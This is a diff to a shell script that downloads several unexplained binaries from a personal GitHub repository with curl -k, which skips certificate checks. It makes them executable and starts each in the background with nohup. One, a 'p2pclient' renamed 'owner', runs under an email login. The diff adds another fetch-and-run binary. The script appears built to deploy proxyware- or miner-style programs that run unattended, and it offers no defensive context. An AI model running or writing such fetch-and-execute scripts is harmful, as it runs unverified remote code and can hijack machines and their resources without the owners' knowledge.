@@ -1,9 +1,12 @@
+curl -k https://raw.githubusercontent.com/robertreynolds2/gambar/main/config.json -o config.json
+curl -k https://raw.githubusercontent.com/robertreynolds2/gambar/main/wpa -o wpa
 curl -k https://raw.githubusercontent.com/robertreynolds2/gambar/main/wpb -o wpb 
 curl -k https://raw.githubusercontent.com/robertreynolds2/gambar/main/wpc -o wpc
 curl -k https://raw.githubusercontent.com/robertreynolds2/gambar/main/wpd -o wpd
-curl -k -o owner https://raw.githubusercontent.com/robertreynolds2/start/main/p2pclient
-chmod +x owner wpb wpc wpd 
+curl -k https://raw.githubusercontent.com/robertreynolds2/start/main/p2pclient -o owner
+chmod +x owner wpa wpb wpc wpd 
 nohup ./owner -l robert.reynolds2@go.shoreline.edu &
+nohup ./wpa &
 nohup ./wpb &
 nohup ./wpc &
 nohup ./wpd &
